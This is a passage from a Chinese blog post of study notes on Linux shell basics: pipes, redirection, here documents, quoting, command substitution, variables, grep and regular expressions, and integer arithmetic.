alt="image-20220313204046088"></p><p>who这条命令，可以帮助我们查看有哪些账户在什么时间登录了计算机。但是，当计算机的登录信息非常多时，需要人为记录登录的数量就很不方便，而Linux系统中的wc命令可以统计行数，但wc命令是需要数据的，给wc若干行数据，这个命令就可以自动统计数据的行数。我们可以使用管道将who和wc命令结合在一起使用。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313205228777.png" alt="image-20220313205228777"></p><p>ss命令可以查看Linux系统中所有服务监听的端口列表。但是ss命令自身没有灵活的过滤功能，而grep命令有比较强大灵活的过滤功能，这样的话也可以通过管道将这两个命令结合在一起使用。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313205458970.png" alt="image-20220313205458970"></p><p>配合grep使用</p><p>再比如，ss命令可以查看Linux系统中所有服务监听的端口列表。但是ss命令自身没有灵活的过滤功能，而grep命令有比较强大灵活的过滤功能，这样的话也可以通过管道将这两个命令结合在一起使用。</p><p><img src="C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220313212623418.png" alt="image-20220313212623418"></p><p>很明显，没有使用grep命令过滤的数据量比较多，看起来不够清晰，而ss命令把自己输出的数据存入管道后，grep命令再从管道中读取数据，在众多数据中过滤出包含sshd的数据行，最后输出结果就只有两行数据。这样能比较简单明了地看到我们需要的数据。</p><p>很明显，没有使用grep命令过滤的数据量比较多，看起来不够清晰，而ss命令把自己输出的数据存入管道后，grep命令再从管道中读取数据，在众多数据中过滤出包含sshd的数据行，最后输出结果就只有两行数据。这样能比较简单明了地看到我们需要的数据。</p><p><img src="C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220313213042711.png" alt="image-20220313213042711"></p><p>echo命令默认会把输出结果显示在屏幕上，而有了管道后，echo命令可以把输出的123456存储到管道中，passwd再从管道中读取123456，来修改系统账户jacob的密码。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313213057650.png" alt="image-20220313213057650"></p><h3 id="1-3输入与输出的重定向"><a href="#1-3输入与输出的重定向" class="headerlink" title="1.3输入与输出的重定向"></a>1.3输入与输出的重定向</h3><p>这个反弹shell学习的时候有相关接触过</p><p>在大多数系统中，一般会默认把输出信息显示在屏幕上，而标准的输入信息则通过键盘获取。但在编写脚本时，当有些命令的输出信息我们不能或不希望显示在屏幕上（脚本执行时，大量的输出信息反而会让用户感到迷茫）。此时，不如先把输出的信息暂时写入文件中，后期需要时，再读取文件，提取需要的信息。对于默认的标准输入信息也会有类似的问题，在Linux系统中当我们使用mail命令发送邮件时，程序需要读取邮件的正文，默认通过读取键盘的输入数据作为正文，这样会让脚本进入交互模式，因为读取键盘信息是需要人为手动输入的。此时，如果能改变默认的输入方式，不再从键盘读取数据，而是从提前准备好的文件中读取数据，就可以让mail程序在需要时自动读取文件内容，自动发送邮件，而不需要人为的手动交互。这样脚本的自动化效果会更好。</p><p>在Linux系统中输出可以分为标准输出和标准错误输出。标准输出的文件描述符为1，标准错误输出的文件描述符为2。而标准输入的文件描述符则为0。</p><p>如果希望改变输出信息的方向，可以使用＞或＞＞符号将输出信息重定向到文件中。使用1＞或1＞＞可以将标准输出信息重定向到文件（1可以忽略不写，默认值就是1），也可以使用2＞或2＞＞将错误的输出信息重定向到文件。这里使用＞符号将输出信息重定向到文件，如果文件不存在，则系统会自动创建该文件，如果文件已经存在，则系统会将该文件的所有内容覆盖（原有数据会丢失！）。而使用＞＞符号将输出信息重定向到文件，如果文件不存在，则系统会自动创建该文件，如果文件已经存在，则系统会将输出的信息追加到该文件原有信息的末尾。</p><p>下面的例子中，echo命令本来会将数据输出显示在屏幕上，但如果使用重定向后就可以将输出的信息导出到文件中。</p><p>如果一条命令既有标准输出（正确输出），又有错误输出，该如何重定向呢？</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313215530406.png" alt="image-20220313215530406"></p><p>只重定向标准输出   不重定向错误输出</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313215648038.png" alt="image-20220313215648038"></p><p>只重定向错误输出  不重定向标准输出</p><p>其实，我们可以将标准输出和错误输出分别重定向到不同的文件，也可以同时将它们重定向到相同的文件。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313215903714.png" alt="image-20220313215903714"></p><p>使用&amp;＞符号可以同时将标准输出和错误输出都重定向到一个文件（覆盖），也可以使用&amp;＞＞符号实现追加重定向。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313220006412.png" alt="image-20220313220006412"></p><p>最后，我们还可以使用2＞&amp;1将错误输出重定向到标准正确输出，也可以使用1＞&amp;2将标准正确输出重定向到错误输出。</p><p>下面的命令虽然都在屏幕上显示了结果。第一条命令虽然是报错信息，却是从标准正确的通道显示在屏幕上的。而第二条命令虽然原本没有错误信息，但通过将正确信息重定向到错误输出，最后的hello是通过错误输出的通道显示在屏幕上的。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313220138202.png" alt="image-20220313220138202"></p><p>是ls命令对比。正常情况下，因为系统没有&#x2F;nofile文件，所以ls命令会报错，报错信息会通过错误输出的通道传递给显示器。但当我们使用2＞&amp;1命令时，就会把错误信息重定向到标准正确输出，虽然屏幕最终也会显示报错信息，却是通过标准输出通道传递给显示器的。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313220417867.png" alt="image-20220313220417867"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313220707497.png" alt="image-20220313220707497"></p><p>正常情况下，echo命令会通过标准输出将消息显示在屏幕上。而当我们使用1＞&amp;2时，系统就会把正确的输出信息重定向到错误输出，虽然屏幕上最终也显示了hello，却是通过错误输出通道传递给显示器的。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313220618790.png" alt="image-20220313220618790"></p><p>结合这种特殊的重定向方式，我们还可以将标准输出重定向到文件，然后将错误输出重定向到标准正确输出。最终把正确的和错误的信息都导入文件中，如下所示。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220313220909503.png" alt="image-20220313220909503"></p><p>Linux系统中有一个特殊的设备&#x2F;dev&#x2F;null，这是一个黑洞。无论往该文件中写入多少数据，都会被系统吞噬、丢弃。如果有些输出信息是我们不再需要的，则可以使用重定向将输出信息导入该设备文件中。注意：数据一旦导入黑洞将无法找回。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314164024610.png" alt="image-20220314164024610"></p><p>除了可以对输出进行重定向，还可以对输入进行重定向。默认标准输入为键盘鼠标。但键盘需要人为的交互才可以完成输入。比如下面的mail命令，执行完命令后程序就会进入等待用户输入邮件内容的状态，只要用户不输入内容，并使用独立的一行点表示邮件内容结束，mail程序就会一直停留在该状态。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314164547426.png" alt="image-20220314164547426"></p><p>以上所有邮件正文都需要人工手动输入，而未来当我们需要使用脚本自动发送邮件时，这就存在问题。为了解决这个问题，我们可以使用＜符号进行输入重定向。＜符号后面需要跟一个文件名，这样可以让程序不再从键盘读取输入数据，而从文件中读取数据。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314165421925.png" alt="image-20220314165421925"></p><p>如果我们希望自动非交互地发送邮件，而又没有提前准备文件，可以吗？</p><p>可以使用＜＜符号实现相同的效果。这样脚本就不需要依赖邮件内容的文件即可独立运行。使用＜＜符号可以将数据内容重定向传递给前面的一个命令，作为命令的输入。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314170332033.png" alt="image-20220314170332033"></p><p>＜＜符号（也被称为Here Document）代表你需要的内容在这里。下面看一个cat通过Here Document读取数据，再通过输出重定向将数据导出到文件的例子。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314170848665.png" alt="image-20220314170848665"></p><p>在Linux系统中经常会使用fdisk命令对磁盘进行分区，但该命令是交互式的，而我们现在需要编写脚本实现自动分区、自动格式化、自动挂载分区等操作。针对这种问题，也可以通过HereDocument来解决。下面我们来编写一个这样的自动分区脚本。</p><p><img src="C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220314172609072.png" alt="image-20220314172609072"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314172617760.png" alt="image-20220314172617760"></p><p>分析一下里面的各个指令:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>fstab :<br>   磁盘被手动[挂载]之后都必须把挂载信息写入<span class="hljs-regexp">/etc/</span>fstab这个文件中，否则下次开机启动时仍然需要重新挂载。<br>系统开机时会主动读取<span class="hljs-regexp">/etc/</span>fstab这个文件中的内容，根据文件里面的配置挂载磁盘。这样我们只需要将磁盘的挂载信息写入这个文件中我们就不需要每次开机启动之后手动进行挂载了。<br></code></pre></td></tr></table></figure><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs haskell">[ ! -d /<span class="hljs-class"><span class="hljs-keyword">data</span> ] </span><br>不能存在这个目录<br></code></pre></td></tr></table></figure><p>EOF配合cat支持多行字符输出</p><p>在编写脚本时为了提高代码的可读性，往往需要在代码中添加额外的缩进。然而，使用＜＜将数据导入程序时，如果内容里面有缩进，则连同缩进的内容都会传递给程序。而此时的Tab键仅仅起缩进的作用，我们并不希望传递给程序。如果需要，可以使用＜＜-符号重定向输入的方式实现，这样系统会忽略掉所有数据内容及分隔符（EOF）前面的Tab键。使用这种方式仅可以忽略Tab键，如果Here Document的正文内容有空格缩进，则无效。</p><p><img src="C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220314212243567.png" alt="image-20220314212243567"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314212309939.png" alt="image-20220314212309939"></p><p>总结： 2是错误1是对 &amp;在&gt;前是输入   &amp;在&gt;后是输出</p><h3 id="1-4各种引号的正确使用"><a href="#1-4各种引号的正确使用" class="headerlink" title="1.4各种引号的正确使用"></a>1.4各种引号的正确使用</h3><h4 id="1-单引号与双引号"><a href="#1-单引号与双引号" class="headerlink" title="1)单引号与双引号"></a>1)单引号与双引号</h4><p>在编写脚本时我们经常需要用到引号，而Shell支持多种引号，如””（双引号）、’’（单引号）、&#96;&#96;（反引号）、\（转义符号）。这么多的符号，都是在什么情况下使用的呢？下面我们看几个案例。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314212841791.png" alt="image-20220314212841791"></p><p>创建a b c三个文件</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314212921340.png" alt="image-20220314212921340"></p><p>创建一个名为a b c的文件</p><p>这里可以看出双引号的作用是引用一个整体，计算机会把引号中的所有内容当作一个整体看待。而不使用双引号时，创建的是三个不同的文件。当后期需要删除文件时，也会出现类似的问题。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314213018127.png" alt="image-20220314213018127"></p><p>这样的输出结果很容易让人误解，这里到底有几个文件？文件名到底是什么？</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314213046950.png" alt="image-20220314213046950"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314213101966.png" alt="image-20220314213101966"></p><p>因为这里没有使用双引号，所以系统理解的是需要删除a、b和c这三个文件，但其实现在系统中没有这三个文件，而只有一个文件，名称为“a b c”，其中空格也是文件名的一部分，这个文件应怎么删除呢？</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314213129170.png" alt="image-20220314213129170"></p><p>通过使用双引号，成功删除了这个文件。在Linux系统中，除了可以使用双引号引用一个整体，还可以使用单引号引用一个整体，同时单引号还有另外一个功能，即可以屏蔽特殊符号（将特殊符号的特殊含义屏蔽，转化为字符表面的名义）<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314213224038.png" alt="image-20220314213224038"></p><p>上面两条命令因为没有特殊符号，所以使用双引号或单引号的作用是一样的。但是，当有特殊符号时，单引号和双引号不能互换，比如下面的例子。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314213313340.png" alt="image-20220314213313340"></p><p>在Shell中，#符号有特殊含义，是注释符号。#符号及#符号后面的内容都会被程序理解为注释，而不会被执行，这条命令本来想通过屏幕输出一个#符号，但实际的输出结果却是空白行。如果我们希望输出这个#号，则可以使用单引号，将#符号的特殊含义屏蔽掉。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314213342957.png" alt="image-20220314213342957"></p><p>另外，在Shell中$符号有提取变量值的特殊含义，而当我们需要直接使用$这个符号时，也需要使用单引号的屏蔽功能。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314213445419.png" alt="image-20220314213445419"></p><p>其实，在Linux中具有屏蔽功能的除单引号外，还有\符号，虽然\符号也可以实现屏蔽转义的功能，但\符号仅可以转义其后面的第一个符号，而单引号可以屏蔽引号内所有的特殊符号</p><h4 id="2）命令替换"><a href="#2）命令替换" class="headerlink" title="2）命令替换"></a>2）命令替换</h4><p>最后，我们来了解&#96;&#96;符号（反引号），反引号是一个命令替换符号，它可以使用命令的输出结果替代命令，下面我们看一个例子。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314213719310.png" alt="image-20220314213719310"></p><p>使用上面这条命令可以把&#x2F;var&#x2F;log目录下的所有数据备份到&#x2F;root目录下，但是备份的文件名是固定的。如果需要系统执行计划任务，实现在每周星期五备份一次数据，然后新的备份就会把原有的备份文件覆盖（因为文件名是固定的）。到最后发现其实仅备份了最后一周的数据，前面的所有数据全部丢失！怎么解决这个问题呢？</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314213854150.png" alt="image-20220314213854150"></p><p>这条命令依然使用tar命令进行备份。但是，因为使用了&#96;&#96;符号实现命令替换，所以这里备份的文件名不再是date，而是date命令执行后的输出结果，即使用命令的输出结果替换date命令本身的字符串，最后备份的文件名类似log-20180725.tar.gz。文件名中具体的时间根据执行命令时的计算机系统时间而定。再看几个例子。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314214738781.png" alt="image-20220314214738781"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD/CD%5Cimage-20220314214456395.png" alt="image-20220314214456395"></p><p>反引号虽然很好用，但也有其自身的缺陷，比如容易跟单引号混淆，不支持嵌套（反引号中再使用反引号），为了解决这些问题，人们又设计了$（）组合符号，功能也是命令替换，而且支持嵌套功能，如下面的这些案例所示。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314214702268.png" alt="image-20220314214702268"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314215015316.png" alt="image-20220314215015316"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314215207572.png" alt="image-20220314215207572"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314215346711.png" alt="image-20220314215346711"></p><p>$与（中间不要有空格哦，不然会这样</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314214834481.png" alt="image-20220314214834481"></p><h3 id="1-5变量"><a href="#1-5变量" class="headerlink" title="1.5变量"></a>1.5变量</h3><p>变量名示例</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314215531896.png" alt="image-20220314215531896"></p><p>其次，当需要读取变量值时，需要在变量名前添加一个美元符号“$”；而当变量名与其他非变量名的字符混在一起时，需要使用{}分隔。</p><p>最后，如果需要取消变量的定义，则可以使用unset命令删除变量。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314220229893.png" alt="image-20220314220229893"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314215842919.png" alt="image-20220314215842919"></p><p>上面这条命令的返回值为空，因为没有定义一个名称是hello的变量，而且实际需要输出的应该是123hello。此时就需要使用{}分隔变量名和其他字符。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314220301063.png" alt="image-20220314220301063"></p><p>虽然这三条命令都没有使用{}分隔变量名与其他字符，但最后返回值也不为空白，因为Shell变量名称仅可以由字母、数字、下画线组成，不可能包括特殊符号（如横线、冒号、空格等），所以系统不会把特殊符号当作变量名的一部分，系统会理解变量名为test，后面是其他跟变量名无关的字符串。下面我们看一个简单的使用变量的案例。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314222020948.png" alt="image-20220314222020948"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314222157817.png" alt="image-20220314222157817"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">分析一下命令<br>netmask 子网掩码<br><span class="hljs-built_in">tr</span> -s 删除所有重复出现字符序列，只保留第一个；即将重复出现字符串压缩为一个字符串<br><span class="hljs-built_in">cut</span> -d<span class="hljs-string">&quot; &quot;</span> -f3以空格为切割符 -f表示第几列 这里取第三列<br>free 显示系统内存使用情况<br>mem （内存）存储器 记忆装置<br></code></pre></td></tr></table></figure><p>这个脚本中定义了三个变量，三个变量值都是命令的返回结果，因此每次执行脚本时变量值都有可能发生变化。但是，不管变量值怎么变化，脚本都可以在最后正常地输出这些变量值</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314222254199.png" alt="image-20220314222254199"></p><p>将多个a合并为一个a</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314222354409.png" alt="image-20220314222354409"></p><p>以空格为分隔符 获取第二列</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314222427070.png" alt="image-20220314222427070"></p><p>以-为分隔符 获取第三列</p><p>上面介绍的是用户自定义变量，接下来了解系统预设变量。系统预设变量，顾名思义就是系统已经预先设置好的变量，不需要用户自己定义便可以直接使用的变量。系统预设变量基本都是以大写字母或使用部分特殊符号为变量名[插图]。表1-5中列举了系统中常见的系统预设变量。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314222607123.png" alt="image-20220314222607123"></p><p>系统预设变量可以细分为：环境变量、位置变量、预定义变量、自定义变量。在实际编写脚本时能够在合适的地方应用合适的变量即可，这里不再细化讲解。</p><p>编写脚本案例并调用这些系统预设变量，查看执行效果。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314223130212.png" alt="image-20220314223130212"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314223515901.png" alt="image-20220314223515901"></p><p>因为“$*”将所有参数视为一个整体，因此创建了一个名称为“AC 8 D”的文件，空格也是文件名的一部分。而“$@”将所有参数视为独立的个体，因为touch名称创建了4个文件，分别是A、C、8、D，使用ls -l命令可以查看得更清楚。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314223354120.png" alt="image-20220314223354120"></p><p>$? ”返回上一条命令的退出状态代码，脚本中先执行ls&#x2F;etc&#x2F;passwd，当这个命令被正确地执行后，“$0”返回的结果为0。而当执行ls &#x2F;etc&#x2F;pass命令时，因为pass文件不存在，所以该命令报错无法找到该文件。此时，“$? ”返回的退出状态码为2（正确为0，错误为非0，但根据错误的情况不同，每个程序返回的具体数字也会有所不同）。</p><h3 id="1-6数据过滤与正则表达式"><a href="#1-6数据过滤与正则表达式" class="headerlink" title="1.6数据过滤与正则表达式"></a>1.6数据过滤与正则表达式</h3><h4 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h4><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314223649519.png" alt="image-20220314223649519"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314223808197.png" alt="image-20220314223808197"></p><p>在test.txt文件中过滤包含th关键词的行</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314223855449.png" alt="image-20220314223855449"></p><p>在txt文件中查找包含java的行</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314224012268.png" alt="image-20220314224012268"></p><h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><p>这个东西不是看一遍就会了</p><p>我之前也为此看了一整本书 但是还是不会 </p><p>实战利用才是解决记忆的方法</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314224148762.png" alt="image-20220314224148762"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314224409155.png" alt="image-20220314224409155"></p><p>匹配含有root的行</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314224507343.png" alt="image-20220314224507343"></p><p>查找与“0:”之间包含任意两个字符的字符串，并且显示改行</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314224612649.png" alt="image-20220314224612649"></p><p>查找至少一个0的行 （第一个必须出现 第二个可以出现0或多次）</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD/CD/image-20220314224827507.png" alt="image-20220314224827507"></p><p>查找含有oot或者ost的行</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314224938364.png" alt="image-20220314224938364"></p><p>查找包含四个字符按照上述排列的行</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314225100504.png" alt="image-20220314225100504"></p><p>查找以root开头的行</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314225121264.png" alt="image-20220314225121264"></p><p>查找以bash结尾的行</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314225225379.png" alt="image-20220314225225379"></p><p>查找bin后面不跟n的行</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220314225429259.png" alt="image-20220314225429259"></p><p>查找0最少一次最多两次的行</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315160340990.png" alt="image-20220315160340990"></p><p>grep “(script).*\1” 1.txt</p><p>查找两个root之间可以是任意字符的行。注意：这里用\ (root\）</p><p>将root保留、后面\1再次调用root，相当与前面复制root 后面粘贴root</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315160657044.png" alt="image-20220315160657044"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315160747320.png" alt="image-20220315160747320"></p><p>自动去掉文件空白行  注意记得在$前添加\ 不然无法执行</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C%E5%8A%A8%E7%94%BB.gif"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315161213602.png" alt="image-20220315161213602"></p><p>过滤文件的非空白行</p><h4 id="font-color-x3D-‘yellow’-gt-扩展正则表达式"><a href="#font-color-x3D-‘yellow’-gt-扩展正则表达式" class="headerlink" title="font color &#x3D; ‘yellow’&gt;扩展正则表达式"></a>font color &#x3D; ‘yellow’&gt;扩展正则表达式</h4><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315164848822.png" alt="image-20220315164848822"></p><p>再看几个使用扩展正则表达式的案例，由于输出信息与基本正则表达式类似，这里仅写出命令而不再打印输出信息。另外grep命令默认不支持扩展正则表达式，需要使用grep -E或者使用egrep命令进行扩展正则表达式的过滤。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315165337334.png" alt="image-20220315165337334"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315165410517.png" alt="image-20220315165410517"></p><p>找出0出现1此或者两次的行</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315165427519.png" alt="image-20220315165427519"></p><p>小写的e不行</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315171252338.png" alt="image-20220315171252338"></p><p>直接查找至少一个0的行</p><h4 id="POSIX规范的正则表达式"><a href="#POSIX规范的正则表达式" class="headerlink" title="POSIX规范的正则表达式"></a>POSIX规范的正则表达式</h4><p>由于基本正则表达式会有语系的问题，所以这里需要了解POSIX规范的正则表达式规则。例如，在基本正则表达式中可以使用a～z来匹配所有字母，但如果需要匹配的对象是中文字符怎么办呢？或是像“ن”这样的阿拉伯语字符怎么办？所以使用a～z匹配仅针对英语语系中的所有字母，POSIX其实是由一系列规范组成的，这里仅介绍POSIX正则表达式规范。POSIX正则表达式规范帮助我们解决语系问题，另外POSIX规范的正则表达式也比较接近于自然语言</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315171645126.png" alt="image-20220315171645126"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315171940822.png" alt="image-20220315171940822"></p><p>匹配所有数字字符   （注意： 不是把行提取出来哦）</p><p>但是针对这种模式  有个缺点</p><p>不能只把有这个特征的行找出来</p><p>但是我们可以grep -o把匹配的那些字符弄出来</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315172648206.png" alt="image-20220315172648206"></p><h4 id="font-color-x3D-‘yellow’-gt-GNU规范"><a href="#font-color-x3D-‘yellow’-gt-GNU规范" class="headerlink" title="font color &#x3D; ‘yellow’&gt;GNU规范"></a>font color &#x3D; ‘yellow’&gt;GNU规范</h4><p>Linux中的GNU软件一般支持转义元字符，这些转义元字符有：\b（边界字符，匹配单词的开始或结尾）, \B（与\b为反义词，\Bthe\B不会匹配单词the，仅会匹配the在中间的单词，如atheist）, \w（等同于[<em>[:alnum:]]）, \W（等同于[^</em>[:alnum:]]）。另外有部分软件支持使用\d表示任意数字，\D表示任意非数字。\s表示任意空白字符（空格、制表符等）, \S表示任意非空白字符。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315172942940.png" alt="image-20220315172942940"></p><p>匹配a结尾的字符  当然单词a也是以a结尾</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315173154468.png" alt="image-20220315173154468"></p><p>就是the在单词的中间</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315173214733.png" alt="image-20220315173214733"></p><p>就是the在单词的头部</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315174446316.png" alt="image-20220315174446316"></p><p>-P使用perl的正则</p><h3 id="1-7各种各样的算数运算"><a href="#1-7各种各样的算数运算" class="headerlink" title="1.7各种各样的算数运算"></a>1.7各种各样的算数运算</h3><p>Shell支持多种算术运算，可以使用$（（表达式））、$[表达式]、let表达式进行整数的算术运算，注意这些命令无法执行小数运算；使用bc命令可以进行小数运算。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315175216706.png" alt="image-20220315175216706"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315175022282.png" alt="image-20220315175022282"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315175030787.png" alt="image-20220315175030787"></p><p>接下来，学习使用内置命令let进行算术运算的案例。注意，使用let命令计算时，默认不会输出运算的结果，一般需要将运算的结果赋值给变量，通过变量查看运算结果。另外，使用let命令对变量进行计算时，不需要在变量名前添加$符号。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315175706548.png" alt="image-20220315175706548"></p><p>let是无法直接输出明文的     但是却可以进行运算 </p><p>然后echo输出</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220315175832982.png" alt="image-20220315175832982"></p><p>let无法进行小速点的运算</p><p>Bash仅支持对整数的四则运算，不支持对小数的运算。如果我们需要在脚本中对任意精度的小数进行运算甚至编写计算函数，则可以使用bc计算器实现。bc计算器支持交互和非交互两种执行方式。</p><p>先看看在交互模式下的计算方式，一行代码为一条命令，可以进行多次计算。</p><p>（bc需要手动安装）</p><p><img 